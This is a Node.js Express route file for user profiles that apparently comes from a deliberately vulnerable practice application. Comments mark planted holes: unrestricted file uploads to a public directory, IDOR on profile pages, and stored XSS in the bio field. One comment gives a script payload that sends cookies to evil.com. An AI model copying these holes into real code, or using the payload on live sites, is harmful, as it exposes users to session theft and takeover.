const express = require('express');
const router = express.Router();
const multer = require('multer');
const path = require('path');
const { db } = require('../db/database');
const { requireAuth } = require('../middleware/auth');

// VULNERABILITY: Insecure file upload configuration
// - No MIME type validation
// - No file size limit enforced
// - Stores file with original extension (allows .php, .js, .html uploads)
// - Upload directory is publicly accessible (public/uploads/)
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, path.join(__dirname, '../../public/uploads/'));
  },
  filename: (req, file, cb) => {
    // VULNERABILITY: Keeps original filename which may contain path traversal characters
    // or dangerous extensions
    cb(null, Date.now() + '-' + file.originalname);
  }
});

// VULNERABILITY: No fileFilter - accepts any file type
const upload = multer({ storage });

// GET /profile
router.get('/', requireAuth, (req, res) => {
  const user = db.prepare('SELECT id, username, email, bio, avatar, created_at FROM users WHERE id = ?').get(req.session.user.id);
  res.render('profile', { title: 'My Profile', profileUser: user, isOwn: true });
});

// GET /profile/:id - view any user's profile
router.get('/:id', (req, res) => {
  // VULNERABILITY: IDOR - any visitor can view any user's profile by ID
  // No authentication or authorization check
  const user = db.prepare('SELECT id, username, email, bio, avatar, created_at FROM users WHERE id = ?').get(req.params.id);
  if (!user) return res.status(404).send('User not found');
  const isOwn = req.session.user && req.session.user.id === user.id;
  res.render('profile', { title: `${user.username}'s Profile`, profileUser: user, isOwn });
});

// POST /profile/update - update profile
router.post('/update', requireAuth, (req, res) => {
  const { bio } = req.body;
  const userId = req.session.user.id;

  // VULNERABILITY: Stored XSS - bio is stored without sanitization
  // An attacker can inject: <script>document.location='http://evil.com?c='+document.cookie</script>
  db.prepare('UPDATE users SET bio = ? WHERE id = ?').run(bio, userId);

  // Update session
  req.session.user.bio = bio;
  res.redirect('/profile');
});

// POST /profile/avatar - upload profile avatar
router.post('/avatar', requireAuth, upload.single('avatar'), (req, res) => {
  if (!req.file) return res.redirect('/profile');

  const avatarPath = '/uploads/' + req.file.filename;
  db.prepare('UPDATE users SET avatar = ? WHERE id = ?').run(avatarPath, req.session.user.id);

  // VULNERABILITY: No validation of file content/MIME type
  // An HTML file could be uploaded and rendered by browsers as a stored XSS attack surface
  res.redirect('/profile');
});

module.exports = router;
